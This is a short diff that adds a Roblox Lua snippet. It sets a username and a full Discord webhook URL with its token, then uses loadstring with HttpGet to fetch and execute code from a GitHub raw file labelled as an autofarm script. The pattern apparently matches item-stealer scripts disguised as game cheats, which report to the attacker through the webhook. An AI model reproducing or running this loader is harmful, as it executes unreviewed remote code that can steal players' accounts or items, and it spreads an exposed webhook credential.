@@ -1,0 +1,4 @@
+UserName = "H3l1c0pt3r_PlayzAlt1"
+WebHook = "https://discordapp.com/api/webhooks/1070335995041558528/2mNuCFLUVQ7io9b-tWeTfCaU7UEKISjlGpMg6JkSE8Gjo34LwH5jm0j8UV8F-iURMbGo"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Galaxyv10/scriptv8/main/autofarmv4", true))()
